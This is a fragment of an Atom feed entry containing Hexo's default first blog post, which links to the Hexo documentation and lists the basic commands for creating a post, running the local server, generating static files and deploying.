    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
